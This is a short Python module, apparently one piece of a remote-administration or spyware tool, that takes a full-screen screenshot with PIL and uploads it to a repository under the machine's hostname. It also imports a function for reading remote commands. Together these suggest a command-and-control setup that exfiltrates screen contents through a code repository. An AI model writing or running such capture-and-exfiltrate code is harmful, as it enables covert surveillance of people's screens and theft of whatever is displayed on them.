# Local Manager: Executing initial tasks on local machine
from modules.repomanager import readRemoteCommands, writeToRepo
import platform
from PIL import ImageGrab


# BRON SCREENSHOT MAKEN
# https://nitratine.net/blog/post/how-to-take-a-screenshot-in-python-using-pil/
def Screenshot():
    filepath = "screenshot.png"
    screenshot = ImageGrab.grab()
    screenshot.save(filepath, "PNG")
    print(platform.node())
    writeToRepo(filepath, platform.node())
